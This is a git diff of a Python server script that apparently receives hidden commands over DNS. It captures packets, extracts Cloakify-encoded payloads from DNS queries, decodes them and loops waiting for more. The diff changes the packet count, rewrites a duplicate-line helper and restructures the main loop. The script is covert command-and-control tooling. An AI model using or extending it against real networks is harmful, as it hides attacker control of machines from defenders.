@@ -16,7 +16,7 @@ def capture_pcap(filename, packet_count):
 
 def receive_command():
     print("Capturing pcap...")
-    capture_pcap("cloaked_command.pcap", 1500) #1500
+    capture_pcap("cloaked_command.pcap", 500) #1500
     print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
@@ -73,48 +73,40 @@ def send_response(response):
     os.remove(cloaked_response)
 
 
-def rimuovi_linee_duplicate(file_input, file_output):
-    # Insieme per tenere traccia delle linee uniche
-    linee_uniche = set()
-    prima_linea = None
-
-    with open(file_input, 'r', encoding='utf-8') as f_input:
-        for linea in f_input:
-            if prima_linea is None:
-                prima_linea = linea
-            if linea not in linee_uniche:
-                linee_uniche.add(linea)
-
-    with open(file_output, 'w', encoding='utf-8') as f_output:
-        if linee_uniche:
-            for linea in linee_uniche:
-                f_output.write(linea)
-        else:
-            f_output.write(prima_linea)
+def remove_dup_lines(file_input, file_output):
+    lines_seen = set() # holds lines already seen
+    outfile = open(file_output, "w")
+    for line in open(file_input, "r"):
+        if line not in lines_seen: # not a duplicate
+            outfile.write(line)
+            lines_seen.add(line)
+    outfile.close()
     return file_output
 
 if __name__ == "__main__":
     print("Server in attesa di richieste...")
-    #dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
-    #cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
+    while True:
+        receive_command()
+"""     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
+    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
     
-    #cloaked_command = rimuovi_linee_duplicate(cloakedFile, cloakedFile+"_")
+    cloaked_command = remove_dup_lines(cloakedFile, "_"+cloakedFile)
+    os.remove(cloakedFile)
+    os.rename("_"+cloakedFile, cloakedFile)
+    cloaked_command = cloakedFile
     decloaked_command = "decloaked_command.txt"
     
-    #with open(cloaked_command, 'r') as file:
-    #    if file.read().strip() == "":
-    #        print("No command received.")
+    with open(cloaked_command, 'r') as file:
+        if file.read().strip() == "":
+            print("No command received.")
             
         
     # Decloakificare il comando
     print("Decloakifying...")
     Decloakify('cloaked.payload', cipher, decloaked_command)
-    
-    '''
-    while True:
-        receive_command()
+     """
+
         
-    '''
 
     
 
